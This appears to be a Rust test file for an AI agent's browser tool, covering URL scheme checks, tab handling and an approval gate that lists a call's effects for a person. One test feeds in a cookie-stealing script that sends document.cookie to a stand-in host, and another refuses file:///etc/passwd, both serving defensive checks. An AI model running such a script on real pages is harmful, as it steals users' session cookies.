use serde_json::json;

use super::*;

#[test]
fn arguments_are_typed_and_unknown_ones_refused() {
    let args: Args =
        serde_json::from_value(json!({"goal": "Search", "values": ["x"], "read": true})).unwrap();
    assert_eq!(
        (args.goal.as_deref(), args.values.len(), args.read),
        (Some("Search"), 1, true)
    );
    assert!(serde_json::from_value::<Args>(json!({"click": "e4"})).is_err());
    assert_eq!(given(&Some("  ".into())), None);
}

fn args(value: Value) -> Args {
    serde_json::from_value(value).unwrap()
}

#[test]
fn only_web_addresses_open() {
    assert_eq!(address("example.com/a").unwrap(), "https://example.com/a");
    for (local, opened) in [
        ("localhost:3000", "http://localhost:3000"),
        ("127.0.0.1:8080/a", "http://127.0.0.1:8080/a"),
        ("0.0.0.0:5173", "http://0.0.0.0:5173"),
        ("[::1]:8000", "http://[::1]:8000"),
        ("[::1]/a", "http://[::1]/a"),
        ("localhost.example.com", "https://localhost.example.com"),
    ] {
        assert_eq!(address(local).unwrap(), opened);
    }
    assert_eq!(
        address("HTTP://localhost:3000").unwrap(),
        "HTTP://localhost:3000"
    );
    for refused in ["file:///etc/passwd", "ftp://x", "chrome://settings"] {
        let Err(ToolError::Failed(why)) = address(refused) else {
            panic!("{refused} was allowed")
        };
        assert!(why.starts_with("only http and https"), "{why}");
    }
}

#[test]
fn the_gate_reads_everything_a_page_will_see() {
    let call = args(json!({
        "goal": "Fill the form\nthen press Send",
        "values": ["me@example.com"],
        "keys": ["Enter"],
        "script": "fetch('https://x/?d=' + document.cookie)\n1",
        "read": true,
    }));
    assert_eq!(
        effects(Some("https://example.com/"), &call)
            .unwrap()
            .unwrap(),
        "open https://example.com/, then goal: Fill the form \u{23ce} then press Send (may type \
         \"me@example.com\"), then keys: Enter, then script: fetch('https://x/?d=' + \
         document.cookie) \u{23ce} 1"
    );
    let looking = args(json!({"read": true, "size": "mobile", "offset": 10}));
    assert_eq!(effects(None, &looking), Ok(None), "reading asks nothing");
}

#[test]
fn a_call_that_only_closes_opens_nothing() {
    assert!(args(json!({"close": true})).only_closes());
    assert!(!args(json!({"close": true, "screenshot": true})).only_closes());
    assert!(!args(json!({"close": true, "url": "example.com"})).only_closes());
    assert!(!args(json!({"screenshot": true, "selector": "#board"})).only_closes());
    let looking = args(json!({"screenshot": true, "selector": "#board", "close": true}));
    assert_eq!(
        effects(None, &looking),
        Ok(None),
        "a screenshot and a close ask nothing"
    );
}

#[test]
fn a_tab_is_new_or_a_number() {
    let new = args(json!({"tab": "new", "url": "example.com"}));
    assert_eq!((new.new_tab(), new.switch_to()), (Ok(true), None));
    let second = args(json!({"tab": 2}));
    assert_eq!((second.new_tab(), second.switch_to()), (Ok(false), Some(2)));
    let written = args(json!({"tab": "2"}));
    assert_eq!(written.switch_to(), Some(2), "a number written as text");
    let wrong = args(json!({"tab": "next", "url": "x.com"}));
    assert!(wrong.new_tab().is_err());
    let Err(ToolError::Failed(why)) = effects(Some("https://x.com"), &wrong) else {
        panic!("a wrong tab was put to the person")
    };
    assert!(why.starts_with("`tab` is"), "{why}");
    assert_eq!(
        args(json!({"tab": "\"new\""})).new_tab(),
        Ok(true),
        "quoted twice"
    );
    assert_eq!(
        effects(Some("https://example.com"), &new).unwrap().unwrap(),
        "open https://example.com in a new tab"
    );
    let closing = args(json!({"close_tab": 2, "tab": 1}));
    assert_eq!(
        effects(None, &closing),
        Ok(None),
        "switching and closing tabs ask nothing"
    );
    assert!(!closing.only_closes());
}

#[test]
fn show_reopens_only_a_window_shown_the_other_way() {
    let show = args(json!({"show": true, "goal": "Play"}));
    assert!(show.reopens(true), "a hidden window is shown");
    assert!(!show.reopens(false), "a shown window is kept, and its page");
    assert!(!args(json!({"goal": "Play"})).reopens(true));
}
